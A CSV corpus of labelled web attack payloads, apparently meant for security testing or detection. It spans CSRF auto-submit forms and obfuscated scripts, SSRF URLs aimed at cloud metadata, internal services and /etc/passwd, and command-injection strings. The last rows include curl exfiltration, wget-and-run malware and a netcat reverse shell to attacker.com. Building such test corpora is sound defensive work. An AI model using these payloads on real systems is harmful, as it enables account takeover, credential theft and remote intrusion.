id,attack_class,type,severity,context,payload_hash,payload
csrf-032,CSRF,CSRF,high,Malicious webpage,997d0b34072f,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>"
csrf-033,CSRF,CSRF,high,Malicious webpage,d61f67a45e2f,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">"
csrf-034,CSRF,CSRF,medium,Malicious webpage,e0494faa21fc,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>
csrf-035,CSRF,CSRF,critical,Malicious webpage,14d73f0357ea,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>
csrf-036,CSRF,CSRF,high,Malicious webpage,c55f504baf02,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>"
csrf-037,CSRF,CSRF,high,Malicious webpage,cfade78088eb,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>"
csrf-040,CSRF,CSRF,high,Malicious webpage,880402431d89,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>"
csrf-041,CSRF,CSRF,high,Malicious webpage,389530314746,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>"
csrf-042,CSRF,CSRF,high,Malicious webpage,753a6750fadb,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>"
csrf-043,CSRF,CSRF,high,Malicious webpage,d0636898a0ee,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>"
csrf-044,CSRF,CSRF,high,Malicious webpage,a636b05c44d9,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>"
csrf-045,CSRF,CSRF,high,Malicious webpage,41d369f85603,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">"
csrf-046,CSRF,CSRF,medium,Malicious webpage,913ec9f7ae65,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>
csrf-047,CSRF,CSRF,critical,Malicious webpage,33715066d4ef,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>"
csrf-048,CSRF,CSRF,high,Malicious webpage,fae315d0aba7,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>"
csrf-049,CSRF,CSRF,high,Malicious webpage,d7e1e872555c,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>"
csrf-051,CSRF,CSRF,critical,Admin panel user management,24e33a8cbec8,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>
csrf-052,CSRF,CSRF,medium,Email service user settings,5e8bb3bd17f2,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>
csrf-053,CSRF,CSRF,high,Security 2FA reset endpoint,d7bf8bc728e4,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>
csrf-054,CSRF,CSRF,medium,Streaming service subscription,3d473f4b81e9,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>
csrf-055,CSRF,CSRF,high,E-commerce user profile,48a38c494092,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>
csrf-056,CSRF,CSRF,medium,Social media friend management,f8de91adaea8,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-057,CSRF,CSRF,medium,Blog comment submission,09ac356afad2,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
csrf-058,CSRF,CSRF,medium,Social media profile update,c9c57b4c6ac1,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>
csrf-059,CSRF,CSRF,critical,Online banking transfer,7fb3269d1b64,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-060,CSRF,CSRF,high,Security settings,7fcebf2c054e,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>
csrf-061,CSRF,CSRF,critical,User account management,42d2cba81036,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>
csrf-062,CSRF,CSRF,high,Continuous Integration webhook settings,ac1aacacc692,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>
csrf-063,CSRF,CSRF,low,Calendar application settings,d961a6063aa5,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>
csrf-064,CSRF,CSRF,high,Email forwarding settings,9c83e9132a9b,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>
csrf-065,CSRF,CSRF,critical,Git hosting service SSH keys,210847a6d78c,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>
csrf-066,CSRF,CSRF,low,User interface settings,0d0053c88491,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>
csrf-067,CSRF,CSRF,low,Newsletter subscription,622b7ed2fbf6,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>
csrf-068,CSRF,CSRF,medium,Social media posting,af831f51f416,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
csrf-069,CSRF,CSRF,medium,SMS spam management,e70a2f816d0a,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>
csrf-070,CSRF,CSRF,high,Payment gateway account settings,53279ca8b153,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>
csrf-071,CSRF,CSRF,high,Code review platform settings,695518e54afb,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>
csrf-072,CSRF,CSRF,high,IoT device management,06539b961bf2,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>
csrf-073,CSRF,CSRF,medium,Calendar event management,22a191983dac,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>
csrf-074,CSRF,CSRF,high,Firewall management,56b511b6a176,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>
csrf-075,CSRF,CSRF,high,DNS management,5811fb3b968c,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>
csrf-076,CSRF,CSRF,low,Mailing list subscription,35b8f5b61d11,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>
csrf-077,CSRF,CSRF,medium,Social media profile,a0b0dbe94a29,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
csrf-079,CSRF,CSRF,medium,App notification settings,95b444329130,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>
csrf-080,CSRF,CSRF,critical,Payment gateway,ae14b43ee9c7,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>
csrf-081,CSRF,CSRF,high,Dynamic base64 decoded form submission,5576c7cdf97b,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>
csrf-082,CSRF,CSRF,high,Hex encoded script with eval,80150a2de6d0,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>
csrf-083,CSRF,CSRF,high,Dynamic iframe with form,34ddd7e00481,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>"
csrf-084,CSRF,CSRF,high,String concatenation obfuscation,33bbe2e9954f,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-085,CSRF,CSRF,medium,User interaction triggered CSRF,c4dc5dd6942d,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>"
csrf-086,CSRF,CSRF,high,Delayed form submission,8b45f6a6aee6,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>"
csrf-087,CSRF,CSRF,high,Encoded element creation,198e83555479,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-088,CSRF,CSRF,critical,Stealth iframe with postMessage,378008f1a10b,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>"
csrf-089,CSRF,CSRF,high,String split and join obfuscation,c4273e4ae4ca,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-090,CSRF,CSRF,critical,Script injection via innerHTML,800c03a6a9c6,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>"
csrf-091,CSRF,CSRF,critical,Base64 encoded eval obfuscation,59ae757aff38,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>
csrf-092,CSRF,CSRF,high,SVG embedded script,68a54d22a239,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>"
csrf-093,CSRF,CSRF,medium,Meta refresh with URL encoding,1ddb0160e716,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>
csrf-094,CSRF,CSRF,high,JavaScript URL with obfuscation,98d606f14aa4,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>"
csrf-095,CSRF,CSRF,high,Image onerror event trigger,ca8178732f68,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>"
csrf-096,CSRF,CSRF,high,Unicode escape obfuscation,b69e96363488,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-097,CSRF,CSRF,high,CSS expression injection,26f386fd9d43,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>"
csrf-098,CSRF,CSRF,critical,XHR POST request,232cedbaec17,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>"
csrf-099,CSRF,CSRF,medium,CSS animation event trigger,21e05cac9c3a,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>
csrf-100,CSRF,CSRF,high,Array join obfuscation,bc59107aef30,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"
ssrf-001,SSRF,SSRF,high,Access internal localhost service,62fe3d14ea42,http://127.0.0.1/
ssrf-002,SSRF,SSRF,high,Access internal network device,8d48b5cec922,http://192.168.1.1/
ssrf-003,SSRF,SSRF,critical,AWS EC2 instance metadata,0ccb496127f4,http://169.254.169.254/latest/meta-data/
ssrf-004,SSRF,SSRF,critical,Google Cloud metadata,f8c69287173b,http://metadata.google.internal/computeMetadata/v1/
ssrf-005,SSRF,SSRF,critical,Azure VM metadata,796ae8c91e31,http://169.254.169.254/metadata/instance?api-version=2021-02-01
ssrf-006,SSRF,SSRF,high,Access internal Redis,0c132b8c3ace,redis://127.0.0.1:6379
ssrf-007,SSRF,SSRF,high,Access internal Memcached,de1b6ca8dc83,memcached://127.0.0.1:11211
ssrf-008,SSRF,SSRF,medium,Access internal FTP,bfe654ddc625,ftp://127.0.0.1/
ssrf-009,SSRF,SSRF,high,Access internal SMB share,2fd035c88018,smb://192.168.1.100/share
ssrf-010,SSRF,SSRF,critical,Access Docker API,8a1c379f5b04,http://127.0.0.1:2375/containers/json
ssrf-011,SSRF,SSRF,critical,Access Kubernetes API,f8f779d5d4b5,https://kubernetes.default.svc/api
ssrf-012,SSRF,SSRF,high,Access Jenkins API,97693c4ef422,http://127.0.0.1:8080/api/json
ssrf-013,SSRF,SSRF,high,Access Elasticsearch,d71b8f9e7c11,http://127.0.0.1:9200/_cat/indices?v
ssrf-014,SSRF,SSRF,high,Access RabbitMQ API,b594334c1baa,http://127.0.0.1:15672/api/overview
ssrf-015,SSRF,SSRF,high,Access MySQL service,356e8478166d,mysql://127.0.0.1:3306
ssrf-016,SSRF,SSRF,high,Access PostgreSQL service,d02b5d638f4c,postgresql://127.0.0.1:5432
ssrf-017,SSRF,SSRF,medium,Access SMTP server,2450835d1da6,smtp://127.0.0.1:25
ssrf-018,SSRF,SSRF,medium,Access SNMP service,000b2aa09110,snmp://127.0.0.1
ssrf-019,SSRF,SSRF,high,Access LDAP service,085bd1b27a25,ldap://127.0.0.1:389
ssrf-020,SSRF,SSRF,critical,Attempt path traversal via SSRF,938674c1f82d,http://127.0.0.1/../../../../etc/passwd
ssrf-021,SSRF,SSRF,high,URL encoded internal IP,9bad7fee4158,http://%31%39%32.%31%36%38.%31.%31/
ssrf-022,SSRF,SSRF,high,Octal encoded IP address,518dea0c82da,http://0300.0250.0001.0001/
ssrf-023,SSRF,SSRF,high,Decimal encoded IP address,f61cb43c10b4,http://3232235777/
ssrf-024,SSRF,SSRF,high,IPv6 localhost,7b94047a04f1,http://[::1]/
ssrf-025,SSRF,SSRF,critical,Local file read attempt,859bc9ce6ccf,file:///etc/passwd
ssrf-026,SSRF,SSRF,critical,Gopher protocol to Redis,dfdd93482255,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A
ssrf-027,SSRF,SSRF,medium,Data URI with embedded script,13f2a258354a,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4="
ssrf-028,SSRF,SSRF,low,JavaScript URI scheme,796a98e66cd9,javascript:alert('SSRF')
ssrf-029,SSRF,SSRF,critical,Access process environment,431c7b6b2994,file:///proc/self/environ
ssrf-030,SSRF,SSRF,critical,Nested URL encoded path traversal,72566526b494,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd
ssrf-031,SSRF,SSRF,critical,FTP directory traversal,d614dff071e5,ftp://127.0.0.1/../../../../etc/passwd
ssrf-032,SSRF,SSRF,critical,SMB UNC path traversal,ccf474e317bb,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts
ssrf-033,SSRF,SSRF,critical,HTTP request smuggling,75ff28e44c99,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
ssrf-034,SSRF,SSRF,critical,HTTP header injection,4aa3696444ec,"http://127.0.0.1:80/
X-Injected-Header: evil"
ssrf-035,SSRF,SSRF,high,Basic auth credentials,4a4e8179f0e0,http://admin:password@127.0.0.1/admin
ssrf-036,SSRF,SSRF,high,Redirect to internal IP,6c22c177996b,http://external.com/redirect?url=http://127.0.0.1/
ssrf-037,SSRF,SSRF,critical,DNS rebinding to internal IP,6c289c319f49,http://evil.com/
ssrf-038,SSRF,SSRF,high,IPv4 mapped IPv6,f6b0c0ebfa4f,http://[::ffff:127.0.0.1]/
ssrf-039,SSRF,SSRF,medium,Encoded newline injection,84fb97637f5e,http://127.0.0.1/%0a%0d
ssrf-040,SSRF,SSRF,medium,Method override parameter,2750f61f3651,http://127.0.0.1/?_method=POST
ssrf-041,SSRF,SSRF,medium,Chunked transfer encoding test,0aceb6cec5e5,http://127.0.0.1/chunked
ssrf-042,SSRF,SSRF,medium,HTTP TRACE method test,6341b598d178,http://127.0.0.1/trace
ssrf-043,SSRF,SSRF,medium,HTTP OPTIONS method test,612fdea3de13,http://127.0.0.1/options
ssrf-044,SSRF,SSRF,medium,HTTP CONNECT method test,2c2d82a397d7,http://127.0.0.1/connect
ssrf-045,SSRF,SSRF,medium,HTTP PATCH method test,9314eba0699a,http://127.0.0.1/patch
ssrf-046,SSRF,SSRF,medium,HTTP DELETE method test,16b4155740fa,http://127.0.0.1/delete
ssrf-047,SSRF,SSRF,medium,HTTP PUT method test,69b52c3c771a,http://127.0.0.1/put
ssrf-049,SSRF,SSRF,high,Inject X-Forwarded-For header,2cf0c00f6820,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1"
ssrf-050,SSRF,SSRF,high,Userinfo section in URL,742ab006740c,http://127.0.0.1@evil.com/
ssrf-051,SSRF,SSRF,medium,Access internal dictionary service,a5f70a213be4,dict://127.0.0.1/
ssrf-052,SSRF,SSRF,medium,Access internal telnet service,ccec8fc49e2b,telnet://127.0.0.1:23
ssrf-053,SSRF,SSRF,high,LDAP query,fb6a5c0e38e6,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid"
ssrf-054,SSRF,SSRF,medium,Access internal RDP service,9743c6c32741,rdp://127.0.0.1:3389
ssrf-055,SSRF,SSRF,high,Access SMB share,c03ec07b8842,smb://127.0.0.1/share
ssrf-056,SSRF,SSRF,medium,Access NFS export,f7768a36543e,nfs://127.0.0.1/export
ssrf-057,SSRF,SSRF,medium,Access IMAP mail server,970919f0ec61,imap://127.0.0.1:143
ssrf-058,SSRF,SSRF,medium,Access POP3 mail server,c64dc6992b92,pop3://127.0.0.1:110
ssrf-059,SSRF,SSRF,medium,Access MQTT broker,a774abdc613f,mqtt://127.0.0.1:1883
ssrf-060,SSRF,SSRF,medium,Access WebSocket service,d36841f5d00b,ws://127.0.0.1:8080/
ssrf-061,SSRF,SSRF,medium,Access secure WebSocket service,175bc5eb15bb,wss://127.0.0.1:8443/
ssrf-062,SSRF,SSRF,low,Bitcoin protocol scheme,ca78a2bf0323,bitcoin://127.0.0.1/
ssrf-063,SSRF,SSRF,low,Magnet link protocol,4bec6d1b0b11,magnet:?xt=urn:btih:abcdef1234567890
ssrf-064,SSRF,SSRF,medium,Access SSH service,088f006225a9,ssh://127.0.0.1:22
ssrf-065,SSRF,SSRF,low,Telephone protocol,e2cc04f5e443,tel:+1234567890
ssrf-066,SSRF,SSRF,low,SMS protocol,43de510d9327,sms:+1234567890
ssrf-067,SSRF,SSRF,low,Geolocation protocol,02d406a26fad,"geo:37.786971,-122.399677"
ssrf-068,SSRF,SSRF,medium,Subversion protocol,74469a1bfbed,svn://127.0.0.1/repo
ssrf-069,SSRF,SSRF,medium,Git protocol,67c083986f75,git://127.0.0.1/repo.git
ssrf-070,SSRF,SSRF,medium,Secure FTP protocol,d889bcfc0543,sftp://127.0.0.1/home/user/
ssrf-071,SSRF,SSRF,high,Double URL encoded IP,efb165297d51,http://%2531%25327%2532%253E%253E%253E/
ssrf-072,SSRF,SSRF,medium,Mixed case HTTP scheme,62fe3d14ea42,HtTp://127.0.0.1/
ssrf-073,SSRF,SSRF,high,Null byte injection,ae39726cc744,http://127.0.0.1%00.example.com/
ssrf-074,SSRF,SSRF,critical,CRLF injection,dbe16bb66d83,"http://127.0.0.1/
Set-Cookie:evil=1"
ssrf-076,SSRF,SSRF,high,IPv6 embedded IPv4 with port,6f017e66023e,http://[::ffff:192.168.1.1]:8080/
ssrf-078,SSRF,SSRF,critical,HTTP header injection,1163998e8f06,http://127.0.0.1/%0d%0aX-Injected-Header:evil
ssrf-080,SSRF,SSRF,critical,File read with null byte,83b1991daf08,file:///etc/passwd%00
ssrf-081,SSRF,SSRF,high,Basic auth with encoding,7b97d9f731b0,http://admin%3Apassword@127.0.0.1/
ssrf-091,SSRF,SSRF,high,Hexadecimal IPv4 address,59687893da22,http://0x7f.0x0.0x0.0x1/
ssrf-092,SSRF,SSRF,high,Shortened IPv4 address,6027c1badb94,http://127.1/
ssrf-093,SSRF,SSRF,high,Integer IPv4 address,058658e148ad,http://2130706433/
ssrf-095,SSRF,SSRF,low,URL fragment,f1a2dbf552a1,http://127.0.0.1/#fragment
ssrf-096,SSRF,SSRF,low,Query parameter,9e634a51eaaa,http://127.0.0.1/?param=value
ssrf-098,SSRF,SSRF,critical,URL encoded path traversal,96e19deada8f,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd
ssrf-099,SSRF,SSRF,critical,Encoded double slash,c20ffbb23e01,http://127.0.0.1/%2f%2f/etc/passwd
ssrf-100,SSRF,SSRF,critical,Mixed encoding and case path traversal,ba4594a4f8a1,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd
cmdinj-001,CmdInj,Command Injection,high,Inject list directory command,a82ab998bb6d,; ls -la
cmdinj-002,CmdInj,Command Injection,critical,Inject read passwd file,60394bb36bc7,&& cat /etc/passwd
cmdinj-003,CmdInj,Command Injection,high,Inject whoami command,62ecaae15141,| whoami
cmdinj-004,CmdInj,Command Injection,high,Inject id command using backticks,87ea5dfc8b8e,id
cmdinj-005,CmdInj,Command Injection,high,Inject uname command,9cf74c097a4f,$(uname -a)
cmdinj-006,CmdInj,Command Injection,high,Nested command substitution,aff5db5d5997,$(echo $(whoami))
cmdinj-007,CmdInj,Command Injection,medium,Inject sleep command for timing attack,6eb16ef1e705,& sleep 10
cmdinj-008,CmdInj,Command Injection,high,Inject command with newline,948d33efe864,"&& echo 'injected'
"
cmdinj-009,CmdInj,Command Injection,critical,Exfiltrate data via curl,5a650351cbf2,; curl http://attacker.com
cmdinj-010,CmdInj,Command Injection,critical,Download and execute malware,aa1ed8ef8403,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh
cmdinj-011,CmdInj,Command Injection,critical,Reverse shell via netcat,b73cfa3ec6d6,| nc attacker.com 4444 -e /bin/sh
